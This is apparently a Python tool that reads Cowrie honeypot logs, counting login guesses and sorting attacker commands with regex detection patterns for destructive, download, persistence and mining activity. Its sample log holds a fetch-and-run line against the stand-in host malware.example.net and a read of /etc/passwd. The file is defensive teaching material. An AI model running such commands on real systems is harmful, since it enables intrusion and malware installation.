"""Cowrie honeypot log reader.  Paste cowrie.json lines (one JSON object per line) or cowrie.log text.
It counts and classifies what an attacker typed.  It never runs, fetches or resolves anything from the log:
URLs are shown defanged (hxxp, [.]) so they can't be clicked by accident."""
import ipaddress
import json
import re
from collections import Counter, defaultdict

MAX_CHARS = 2_000_000
MAX_LINES = 50_000


class HpError(Exception):
    def __init__(self, message: str, status: int = 400):
        super().__init__(message)
        self.message, self.status = message, status


TEXT_LOGIN = re.compile(r"login attempt \[(?P<u>[^/\]]*)/(?P<p>[^\]]*)\]\s*(?P<r>failed|succeeded)", re.I)
TEXT_CMD = re.compile(r"CMD:\s*(?P<c>.+)$")
TEXT_CONN = re.compile(r"New connection:\s*(?P<ip>[0-9a-fA-F:.]+):\d+")
TEXT_TS = re.compile(r"\[?(?P<ts>\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2})")
URL = re.compile(r"(?:https?|ftp|tftp)://[^\s'\";|&<>)]+", re.I)

CLASSES = [
    ("destructive", re.compile(r"\brm\s+-[a-z]*r[a-z]*f?\s+/|\bmkfs\b|\bdd\s+if=.*of=/dev/|:\(\)\s*\{|\bshred\b|>\s*/dev/sd", re.I), "Tries to erase or break the system."),
    ("download", re.compile(r"\b(wget|curl|tftp|ftpget|scp|fetch)\b", re.I), "Fetches a file, usually malware or a tool."),
    ("execute", re.compile(r"(^|[;&|]\s*)(\./|sh\s|bash\s|python\d?\s|perl\s|chmod\s+\+?[0-7x]+)", re.I), "Makes something executable or runs it."),
    ("persistence", re.compile(r"authorized_keys|crontab|/etc/cron|rc\.local|systemctl\s+enable|\.bashrc|useradd|adduser|passwd\s+\w", re.I), "Tries to stay on the machine or add access."),
    ("miner", re.compile(r"xmrig|minerd|stratum\+|cpuminer|nicehash|monero", re.I), "Cryptocurrency mining."),
    ("recon", re.compile(r"\b(uname|whoami|id|hostname|uptime|w|who|last|ps|top|ifconfig|ip\s+a|netstat|ss|lscpu|free|df|env|cat\s+/proc/\S+|cat\s+/etc/(passwd|issue|os-release|shadow)|ls|pwd)\b", re.I), "Looks around to learn what the machine is."),
]


def defang(s: str) -> str:
    return re.sub(r"^(https?|ftp|tftp)", lambda m: {"http": "hxxp", "https": "hxxps"}.get(m.group(1).lower(), m.group(1)), s, flags=re.I).replace(".", "[.]")


def classify(cmd: str) -> list[str]:
    return [name for name, rx, _ in CLASSES if rx.search(cmd)]


DOC_NETS = ("192.0.2.0/24", "198.51.100.0/24", "203.0.113.0/24")


def _private(ip: str) -> bool:
    try:
        a = ipaddress.ip_address(ip)
    except ValueError:
        return False
    if any(a in ipaddress.ip_network(n) for n in DOC_NETS):      # documentation ranges stand in for internet hosts in examples
        return False
    return a.is_private or a.is_loopback or a.is_link_local


def _events(text: str) -> tuple[list[dict], dict]:
    ev, bad, truncated = [], 0, False
    lines = text.splitlines()
    if len(lines) > MAX_LINES:
        lines, truncated = lines[:MAX_LINES], True
    fmt = Counter()
    for raw in lines:
        s = raw.strip()
        if not s:
            continue
        if s.startswith("{"):
            try:
                d = json.loads(s)
            except ValueError:
                bad += 1
                continue
            if not isinstance(d, dict) or "eventid" not in d:
                bad += 1
                continue
            fmt["json"] += 1
            ev.append({"id": str(d.get("eventid")), "ip": str(d.get("src_ip", "")), "user": d.get("username"), "pw": d.get("password"), "cmd": d.get("input"),
                       "url": d.get("url"), "ts": str(d.get("timestamp", ""))[:19].replace("T", " "), "session": str(d.get("session", "")), "ok": d.get("eventid") == "cowrie.login.success"})
            continue
        m = TEXT_LOGIN.search(s)
        t = TEXT_TS.search(s)
        ts = t["ts"].replace("T", " ") if t else ""
        if m:
            fmt["text"] += 1
            ev.append({"id": "cowrie.login.success" if m["r"].lower() == "succeeded" else "cowrie.login.failed", "ip": "", "user": m["u"], "pw": m["p"], "cmd": None, "url": None, "ts": ts, "session": "", "ok": m["r"].lower() == "succeeded"})
            continue
        m = TEXT_CMD.search(s)
        if m:
            fmt["text"] += 1
            ev.append({"id": "cowrie.command.input", "ip": "", "user": None, "pw": None, "cmd": m["c"].strip(), "url": None, "ts": ts, "session": "", "ok": False})
            continue
        m = TEXT_CONN.search(s)
        if m:
            fmt["text"] += 1
            ev.append({"id": "cowrie.session.connect", "ip": m["ip"], "user": None, "pw": None, "cmd": None, "url": None, "ts": ts, "session": "", "ok": False})
            continue
        bad += 1
    return ev, {"bad_lines": bad, "truncated": truncated, "format": "json" if fmt["json"] >= fmt["text"] and fmt["json"] else ("text" if fmt["text"] else "unknown")}


def analyze(text: str) -> dict:
    if not isinstance(text, str) or not text.strip():
        raise HpError("Paste Cowrie log lines first (cowrie.json is best).")
    if len(text) > MAX_CHARS:
        raise HpError("That is over 2 MB. Paste one day at a time.", 413)
    ev, meta = _events(text)
    if not ev:
        raise HpError("I couldn't find Cowrie events. Expect cowrie.json lines such as {\"eventid\":\"cowrie.login.failed\",...} or cowrie.log lines such as 'login attempt [root/123456] failed'.")
    ips, users, pws, pairs, cmds, hours, urls = Counter(), Counter(), Counter(), Counter(), Counter(), Counter(), Counter()
    sess_cmds, sess_ip = defaultdict(list), {}
    attempts = successes = 0
    cls = Counter()
    seen_cmd_cls: dict[str, list[str]] = {}
    for e in ev:
        if e["ip"]:
            ips[e["ip"]] += 1
            if e["session"]:
                sess_ip[e["session"]] = e["ip"]
        elif e["session"] in sess_ip:
            pass
        if e["id"].startswith("cowrie.login."):
            attempts += 1
            successes += 1 if e["ok"] else 0
            if e["user"] is not None:
                users[str(e["user"])] += 1
            if e["pw"] is not None:
                pws[str(e["pw"])] += 1
            if e["user"] is not None and e["pw"] is not None:
                pairs[f"{e['user']}/{e['pw']}"] += 1
        if e["cmd"]:
            c = str(e["cmd"]).strip()
            cmds[c[:200]] += 1
            k = classify(c)
            seen_cmd_cls[c[:200]] = k
            for x in k:
                cls[x] += 1
            sess_cmds[e["session"] or "-"].append(c[:200])
            for u in URL.findall(c):
                urls[u[:200]] += 1
        if e["url"]:
            urls[str(e["url"])[:200]] += 1
        if len(e["ts"]) >= 13:
            hours[e["ts"][11:13]] += 1
    # sessions that logged in successfully and ran something
    interactive = [{"session": s, "ip": sess_ip.get(s, ""), "commands": c[:12], "count": len(c), "classes": sorted({x for cc in c for x in classify(cc)})} for s, c in sess_cmds.items()][:20]
    private_src = [ip for ip in ips if _private(ip)]
    findings = []
    if successes:
        findings.append({"severity": "info", "title": f"{successes} login(s) succeeded", "detail": "Cowrie lets some guesses in on purpose so attackers reveal what they do next. That's the point of the trap, not a breach of your real machine."})
    if cls.get("download"):
        findings.append({"severity": "high", "title": "Download commands seen", "detail": "Attackers tried to fetch a file. Cowrie saves downloads for study; never run them, and treat every URL as malicious."})
    if cls.get("destructive"):
        findings.append({"severity": "medium", "title": "Destructive commands typed", "detail": "These ran against a fake file system, so nothing real was damaged. On a real server they would have been."})
    if cls.get("persistence"):
        findings.append({"severity": "medium", "title": "Persistence attempts", "detail": "authorized_keys, cron or new users: the habit that matters most for real servers is to alert on these."})
    if cls.get("miner"):
        findings.append({"severity": "medium", "title": "Cryptominer indicators", "detail": "Mining software is the most common payload on exposed SSH servers."})
    if private_src and len(private_src) == len(ips):
        findings.append({"severity": "info", "title": "All sources are private addresses", "detail": "This is traffic from your own lab (your test machine), not from the internet. Real attackers appear only if the honeypot is reachable from outside, which is risky; see the notes."})
    elif private_src:
        findings.append({"severity": "info", "title": f"{len(private_src)} private source address(es)", "detail": "Those are your own machines; leave them out of any threat statistics."})
    top = lambda c, n=10: [{"value": k, "count": v} for k, v in c.most_common(n)]
    return {
        "format": meta["format"], "events": len(ev), "bad_lines": meta["bad_lines"], "truncated": meta["truncated"],
        "login_attempts": attempts, "logins_succeeded": successes, "unique_ips": len(ips), "unique_usernames": len(users), "unique_passwords": len(pws),
        "top_ips": top(ips), "top_usernames": top(users), "top_passwords": top(pws), "top_pairs": top(pairs),
        "top_commands": [{"value": k, "count": v, "classes": seen_cmd_cls.get(k, [])} for k, v in cmds.most_common(12)],
        "command_classes": [{"class": n, "count": cls.get(n, 0), "meaning": m} for n, _, m in CLASSES if cls.get(n)],
        "urls_defanged": [{"value": defang(k), "count": v} for k, v in urls.most_common(10)],
        "by_hour": [{"hour": h, "count": hours[h]} for h in sorted(hours)],
        "sessions": interactive, "findings": findings,
        "lesson": "A honeypot's value is the pattern: which usernames and passwords bots try, which commands follow a successful login, and where payloads come from. Counting and classifying (recon, download, execute, persistence) turns a log into a short list of what to block or alert on in your real systems.",
        "limit": "Reads pasted text only; nothing is fetched or executed. Country and ownership lookups need an IP-intelligence service, which isn't built here. Command classes are pattern matches: a human still has to read the unusual sessions.",
    }


SLIPS = [
    "Poster 07 lists 'log/auth.log', 'log/commands.log', 'log/ips.txt' and 'log/tty.log' as Cowrie log files. Cowrie writes cowrie.log and cowrie.json, session recordings under var/lib/cowrie/tty, and downloads under var/lib/cowrie/downloads. 'ips.txt', 'usernames.txt' and similar files in the examples are ones you create yourself with grep and sort.",
    "Poster 10 uses 'bin/cowriectl status' and 'sudo systemctl status cowrie'. Cowrie's own control script is 'bin/cowrie start|stop|status'; a systemd service exists only if you wrote one.",
    "The series says 'real attack data' and also 'run only in an isolated lab, never expose it'. Both can't hold: an isolated honeypot sees only your own test traffic. Real attackers appear only when it is reachable from the internet, which needs a separate, locked-down machine and network.",
    "Poster 07 and 08 show the example attacker address 185.199.108.23. Addresses in 185.199.108.0/22 belong to GitHub's hosting; treat the numbers as sample values and don't block or report them from this example.",
    "Poster 08's 'example Python output' prints a numbered list, but the shown code prints only Counter(ips).most_common(10), a list of tuples; the formatting needs a loop.",
    "Poster 08 counts differ from poster 07 for the same address (321 and 128 attempts), so the figures are illustrative, not one data set.",
]
NOT_BUILT = ["Running Cowrie itself (needs a Raspberry Pi or VM and a network), Grafana, ELK or any SIEM.", "IP-to-country lookups, reputation feeds and automatic alerts."]

SAMPLE = "\n".join([
    '{"eventid":"cowrie.session.connect","src_ip":"203.0.113.7","timestamp":"2026-01-10T14:22:11Z","session":"a1"}',
    '{"eventid":"cowrie.login.failed","src_ip":"203.0.113.7","username":"root","password":"123456","timestamp":"2026-01-10T14:22:12Z","session":"a1"}',
    '{"eventid":"cowrie.login.failed","src_ip":"203.0.113.7","username":"admin","password":"admin","timestamp":"2026-01-10T14:22:18Z","session":"a1"}',
    '{"eventid":"cowrie.login.success","src_ip":"203.0.113.7","username":"root","password":"toor","timestamp":"2026-01-10T14:22:30Z","session":"a1"}',
    '{"eventid":"cowrie.command.input","src_ip":"203.0.113.7","input":"uname -a","timestamp":"2026-01-10T14:22:35Z","session":"a1"}',
    '{"eventid":"cowrie.command.input","src_ip":"203.0.113.7","input":"cat /etc/passwd","timestamp":"2026-01-10T14:22:40Z","session":"a1"}',
    '{"eventid":"cowrie.command.input","src_ip":"203.0.113.7","input":"wget http://malware.example.net/bot.sh -O /tmp/s.sh","timestamp":"2026-01-10T14:22:55Z","session":"a1"}',
    '{"eventid":"cowrie.command.input","src_ip":"203.0.113.7","input":"chmod +x /tmp/s.sh; /tmp/s.sh","timestamp":"2026-01-10T14:23:01Z","session":"a1"}',
    '{"eventid":"cowrie.login.failed","src_ip":"198.51.100.20","username":"pi","password":"raspberry","timestamp":"2026-01-10T15:01:02Z","session":"b2"}',
    '{"eventid":"cowrie.login.failed","src_ip":"192.168.56.20","username":"root","password":"123456","timestamp":"2026-01-10T15:12:25Z","session":"c3"}',
])


def reference() -> dict:
    return {"files": [{"file": "var/log/cowrie/cowrie.log", "what": "Human-readable log of every event."}, {"file": "var/log/cowrie/cowrie.json", "what": "The same events as JSON lines: use this for analysis."},
                      {"file": "var/lib/cowrie/tty/", "what": "Recordings of attacker sessions, replayable with bin/playlog."}, {"file": "var/lib/cowrie/downloads/", "what": "Files attackers tried to fetch (malware: never run)."}],
            "classes": [{"class": n, "meaning": m} for n, _, m in CLASSES],
            "safety": ["Keep the honeypot on an isolated network until you understand the risk; a compromised honeypot can be used to attack others.", "Never open or run anything it downloads.", "Use only simulated commands when testing it."],
            "slips": SLIPS, "not_built": NOT_BUILT, "sample": SAMPLE}
